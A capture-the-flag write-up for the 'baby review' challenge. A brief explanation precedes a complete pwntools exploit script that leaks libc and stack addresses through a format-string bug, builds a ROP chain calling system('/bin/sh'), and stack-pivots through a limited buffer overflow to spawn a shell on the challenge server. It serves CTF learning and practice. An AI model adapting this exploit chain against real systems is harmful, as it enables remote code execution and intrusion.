# baby review

This is a simple challenge, there is a format string vuln and a buffer overflow so we can get leaks to break PIE and use a ROP chain to get a shell. One other problem is that the overflow is limited so we use a stack pivot to another buffer which has our ROP chain.

```python
from pwn import *
import requests, json

def capital():
	# do country/capital nonsense
	io.recvuntil(b"capital of ")
	country = io.recvline()[:-2].decode()
	req = requests.get(f"https://restcountries.com/v3.1/name/{country}")
	data = json.loads(req.text)
	capital = data[0]['capital'][0]
	log.info(f"country is {country} and capital is {capital}")
	io.sendline(capital.encode())

if args.REMOTE:
	io = remote('chals.damctf.xyz', 30888)
	capital()

elif args.GDB:
	io = process("./baby-review")
	gdbscript="""
	c
	"""
	gdb.attach(io, gdbscript=gdbscript)
	io.sendline(b'wash')

else:
	io = process("./baby-review")
	io.sendline(b'wash')
libc = ELF("./libc.so.6")

# get leaks using format string vuln
io.sendlineafter(b'Exit', b'5')
payload = b'%lx-'*50
io.sendlineafter(b'list', payload)
io.sendlineafter(b'Exit', b'2')
io.recvuntil(b'https://www.youtube.com/watch?v=Icx4xul9LEE\n')

leak = io.recvline().decode().split('-')
libc_addr = int(leak[2], 16)
stack_addr = int(leak[4], 16)
libc.address = libc_addr - 0x114a37
return_addr = stack_addr - 0x440
log.info(f"libc address is: {hex(libc.address)}")
log.info(f"return address is: {hex(return_addr)}")

# gadgets
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
ret = libc.address + 0x0000000000029cd6

# fill return address(movie review buffer) with rop chain 
io.sendlineafter(b'Exit', b'3')
io.sendlineafter(b'review?', b'B'*58)
payload = p64(stack_addr)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(libc.sym['system'])
io.sendlineafter(b'below:', payload)

# get shell - stack pivot to review buffer cuz limited space
io.sendlineafter(b'Exit', b'4')
payload = b'A'*32
payload += p64(return_addr)
io.sendafter(b'records?', payload)

io.interactive()
```